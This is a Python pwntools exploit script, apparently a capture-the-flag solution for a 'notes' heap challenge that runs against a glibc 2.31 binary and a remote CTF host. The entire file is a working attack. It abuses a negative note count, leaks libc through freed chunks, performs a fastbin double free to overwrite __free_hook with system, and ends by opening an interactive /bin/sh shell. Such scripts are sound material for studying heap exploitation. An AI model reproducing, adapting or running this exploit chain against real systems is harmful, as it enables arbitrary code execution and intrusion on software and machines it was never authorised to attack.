#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
  if args.GDB:  # GDB NOASLR
    context.terminal = ["/usr/bin/x-terminal-emulator", "-e"]
    return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
  elif args.REMOTE:
    return remote('notes.nc.jctf.pro', 5001, *a, **kw)
  else:
    return process([exe] + argv, *a, **kw)
gs = '''
b *main+206
c

'''.format(**locals())
exe = './notes_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.31.so')
context.log_level = 'info'

def add(size, data):
  io.sendafter(b"> ", b'1')
  io.sendafter(b"size: ", str(size).encode())
  io.sendafter(b"content: ", data)

def delete(idx):
  io.sendafter(b"> ", b'2')
  io.sendafter(b"note id: ", str(idx).encode())

def show(idx):
  io.sendafter(b"> ", b'3')
  io.sendafter(b"note id: ", str(idx).encode())
  # return io.recvuntil(b"1. add note")
  return io.recvline()

io = start()

io.sendafter(b"How many notes you plan to use? (0-10): ", b'-1')

for i in range(10):
  add(0xf8, str(i).encode() *0xf8)
for i in range(7):
  delete(i)
delete(7)
# 0-9
leak = show(7)
print(leak)
libc.address = u64(leak[:-1].ljust(8, b'\x00')) - 2018272
log.info(f"leak = {hex(libc.address)}")

# fill tcache 0x20 chunks slot
for i in range(9):
  add(0x18, str(i).encode()*0x18)
for i in range(9):
  delete(10+i)

# fastbin double free attack 
delete(17)
delete(18)
delete(17)

# free 6 tcache 0x20
for i in range(7):
  add(0x18, b'a'*0x18)

add(0x18, p64(libc.sym.__free_hook))

add(0x18, b'a'*0x18)
add(0x18, b'a'*0x18)

# change __free_hook to system
add(0x18, p64(libc.sym.system))
add(0x18, b'/bin/sh\x00')
io.interactive()